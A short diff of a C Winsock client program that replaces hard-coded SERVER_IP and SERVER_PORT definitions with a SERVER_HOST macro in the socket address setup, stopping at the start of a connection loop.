@@ -1,9 +1,6 @@
 #include <winsock2.h>
 #include <stdio.h>
 
-#define SERVER_IP "192.168.45.209"
-#define SERVER_PORT 4242
-
 int main(int argc, char *argv[])
 {
     // init socket lib
@@ -14,7 +11,7 @@ int main(int argc, char *argv[])
     struct sockaddr_in hints = {
         .sin_family = AF_INET,
         .sin_port = htons(SERVER_PORT),
-        .sin_addr.s_addr = inet_addr(SERVER_IP)};
+        .sin_addr.s_addr = inet_addr(SERVER_HOST)};
 
     while (1)
     {
